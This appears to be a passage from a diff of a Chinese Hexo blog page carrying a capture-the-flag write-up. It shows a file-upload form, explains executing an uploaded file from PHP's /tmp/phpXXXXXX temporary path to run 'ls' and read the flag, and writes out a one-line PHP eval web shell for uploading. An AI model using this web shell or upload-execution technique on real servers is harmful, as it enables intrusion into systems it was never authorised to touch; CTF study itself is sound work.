class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://47.98.234.232:*****/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>   </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提交一个1.txt的文件，这个文件会被保存在这个<code>/tmp/phpXXXXXX</code>临时文件夹下，我们执行这个临时文件夹就是执行1.txt文件里面的内容。</p>
+<p>我们在把1.txt中写入<code>ls</code>，并把执行完<code>1.txt</code>文件返回的内容（即执行ls返回的内容）保存在<code>var/www/html</code>目录下的abc文件中</p>
+<p><code>var/www/html</code>是Apache的默认路径</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/17.png" alt="19"></p>
+<p>接着在ip地址后添加<code>/abc</code>，可以看到成功返回执行1.txt后的内容。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/18.png" alt="18"></p>
+<p>直接<code>cat flag</code></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/19.png" alt="22"></p>
+<p>我们还可以上传一个小马文件<code>get flag</code></p>
+<p>例如我们创建一个hello.php的文件，文件内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval(\$_POST[&#39;shell&#39;]);&quot; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/20.png" alt="4"></p>
+<p>然后<code>cat flag</code></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/21.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/12/21/%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9D%82%E9%A1%B9%E7%BB%BC%E5%90%88/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1716,7 +1915,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1769,12 +1968,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">109k</span>
+    <span title="站点总字数">155k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:39</span>
+    <span title="站点阅读时长">2:21</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
